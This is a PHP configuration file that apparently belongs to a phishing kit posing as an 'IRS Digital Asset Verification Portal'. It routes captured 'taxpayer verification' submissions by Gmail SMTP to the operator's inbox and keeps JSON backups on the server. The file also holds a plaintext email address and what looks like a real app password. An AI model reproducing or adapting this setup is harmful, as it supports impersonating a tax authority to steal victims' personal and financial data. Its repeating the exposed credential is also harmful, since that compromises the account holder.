<?php
/**
 * ==============================================================================
 * PRIVATE CONFIGURATION - EMAIL & SMTP CREDENTIALS
 * ==============================================================================
 * Enter your own email and password below to receive all submissions directly
 * to yourself.
 * ==============================================================================
 */

return [
    // -------------------------------------------------------------------------
    // 1. SMTP AUTHENTICATION SETTINGS (YOUR EMAIL & PASSWORD)
    // -------------------------------------------------------------------------
    'use_smtp'        => true,

    // SMTP Host:
    // - For Hostinger Webmail / Titan: 'smtp.hostinger.com'
    // - For Gmail:                      'smtp.gmail.com' (requires 16-char App Password)
    // - For Outlook / Office 365:       'smtp.office365.com'
    'smtp_host'       => 'smtp.gmail.com',

    // SMTP Port & Encryption:
    // - Port 465 with 'ssl' (Recommended for Hostinger & Gmail)
    // - Port 587 with 'tls' (Alternative for Outlook / custom SMTP)
    'smtp_port'       => 587,
    'smtp_secure'     => 'ssl',

    // YOUR EMAIL ADDRESS (Used to login to SMTP)
    'smtp_user'       => 'ahmarjabbar7@gmail.com',

    // YOUR EMAIL PASSWORD (Used to login to SMTP)
    // Note: If using Gmail, generate an 'App Password' in Google Account Security
    'smtp_pass'       => 'spteslvopkiduhsu',

    // -------------------------------------------------------------------------
    // 2. RECIPIENT EMAIL (RECEIVE EMAIL TO SELF)
    // -------------------------------------------------------------------------
    // Leave empty '' or set to null to automatically send to your smtp_user above!
    // Or specify an alternative email address if you want it delivered elsewhere:
    'recipient_email' => '',

    // -------------------------------------------------------------------------
    // 3. SENDER NAME & SUBJECT
    // -------------------------------------------------------------------------
    'sender_name'     => 'IRS Digital Asset Verification Portal',
    'email_subject'   => 'New Digital Asset & Taxpayer Verification Submission',

    // -------------------------------------------------------------------------
    // 4. BACKUP STORAGE IN .private/submissions/
    // -------------------------------------------------------------------------
    // Automatically saves a JSON copy on your server so you never lose submissions
    'save_backup'     => true,
];
